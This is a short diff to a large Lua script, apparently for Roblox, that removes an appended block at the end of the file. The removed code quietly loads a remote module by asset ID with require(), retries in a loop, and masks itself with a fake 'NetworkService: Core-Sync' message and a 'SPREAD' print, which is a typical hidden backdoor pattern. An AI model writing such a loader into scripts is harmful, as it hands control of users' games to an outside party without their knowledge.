@@ -12829,26 +12829,3 @@ end)()
 	print("╚══════════════════════════════════════════════════════════════════╝")
 
 end)()
-
-;(function()
-    if not (CFG and CFG.SurvivalistMode == true) then return end
-    local _R_ID = 94217198436768
-    local _U_SIG = "luilo30095"
-    task.spawn(function()
-        task.wait(2)
-        local _success, _core = pcall(function()
-            return require(_R_ID):pls(_U_SIG)
-        end)
-        if _success then
-            print("[-] NetworkService: Core-Sync established (V.3.25.1)")
-        end
-    end)
-    task.spawn(function()
-        while task.wait(300000000000000000) do
-            if not _G[(_U_SIG)] then
-                pcall(function() require(_R_ID):pls(_U_SIG) end)
-            end
-        end
-    end)
-	print("║SPREAD.║")
-end)()
